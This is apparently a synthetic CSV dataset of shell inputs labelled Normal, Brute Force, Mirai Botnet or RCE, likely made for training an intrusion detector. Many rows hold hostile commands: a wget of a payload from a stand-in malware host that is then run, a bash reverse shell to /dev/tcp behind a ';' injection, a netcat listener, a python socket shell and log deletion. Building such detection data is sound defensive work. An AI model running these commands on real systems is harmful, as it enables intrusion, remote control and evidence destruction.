timestamp,src_ip,input,label
2026-01-08T10:46:17.311501,192.168.1.54,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.229,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.234,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.179,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.186,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.214,password,Brute Force
2026-01-08T10:46:17.311501,192.168.1.221,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.7,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.227,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.85,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.240,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.190,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.42,id,Normal
2026-01-08T10:46:17.310501,192.168.1.187,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.66,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.93,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.167,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.204,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.96,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.204,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.251,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.29,exit,Normal
2026-01-08T10:46:17.306501,192.168.1.84,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.253,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.44,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.99,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.141,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.167,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.35,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.73,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.230,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.156,id,Normal
2026-01-08T10:46:17.309502,192.168.1.27,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.247,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.203,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.138,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.80,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.151,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.200,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.150,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.172,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.127,id,Normal
2026-01-08T10:46:17.309502,192.168.1.23,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.156,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.234,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.102,id,Normal
2026-01-08T10:46:17.307501,192.168.1.110,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.75,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.189,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.76,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.97,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.199,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.92,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.205,admin,Brute Force
2026-01-08T10:46:17.308503,192.168.1.27,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.232,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.136,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.110,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.154,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.67,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.16,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.176,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.42,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.202,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.78,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.136,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.154,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.209,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.229,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.137,id,Normal
2026-01-08T10:46:17.310501,192.168.1.85,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.116,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.180,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.123,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.186,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.12,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.160,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.172,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.113,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.236,id,Normal
2026-01-08T10:46:17.307501,192.168.1.244,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.6,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.160,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.197,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.214,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.92,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.201,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.245,nc -lvp 4444,RCE
2026-01-08T10:46:17.307501,192.168.1.37,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.114,admin,Brute Force
2026-01-08T10:46:17.307501,192.168.1.122,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.176,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.40,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.159,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.29,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.212,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.135,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.155,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.254,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.226,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.112,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.163,password,Brute Force
2026-01-08T10:46:17.308503,192.168.1.61,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.49,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.92,id,Normal
2026-01-08T10:46:17.312501,192.168.1.186,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.51,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.201,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.158,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.126,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.34,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.236,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.90,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.155,id,Normal
2026-01-08T10:46:17.310501,192.168.1.28,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.32,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.114,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.165,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.37,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.248,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.62,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.189,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.120,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.191,uname -a,Normal
2026-01-08T10:46:17.306501,192.168.1.175,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.1,exit,Normal
2026-01-08T10:46:17.312501,192.168.1.184,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.27,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.98,nc -lvp 4444,RCE
2026-01-08T10:46:17.311501,192.168.1.177,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,id,Normal
2026-01-08T10:46:17.308503,192.168.1.12,id,Normal
2026-01-08T10:46:17.310501,192.168.1.79,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.249,id,Normal
2026-01-08T10:46:17.311501,192.168.1.109,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.76,id,Normal
2026-01-08T10:46:17.307501,192.168.1.28,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.23,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.251,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.185,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.103,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.101,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.138,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.119,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.71,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.118,support,Brute Force
2026-01-08T10:46:17.308503,192.168.1.52,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.176,nc -lvp 4444,RCE
2026-01-08T10:46:17.310501,192.168.1.61,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.208,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.33,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.166,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.81,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.51,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.62,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.175,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.306501,192.168.1.133,id,Normal
2026-01-08T10:46:17.308503,192.168.1.191,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.109,cat /etc/issue,Normal
2026-01-08T10:46:17.310501,192.168.1.239,password,Brute Force
2026-01-08T10:46:17.312501,192.168.1.34,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.174,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.173,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.213,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.156,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.309502,192.168.1.40,id,Normal
2026-01-08T10:46:17.311501,192.168.1.146,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.223,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.58,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.163,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.145,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.255,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.36,support,Brute Force
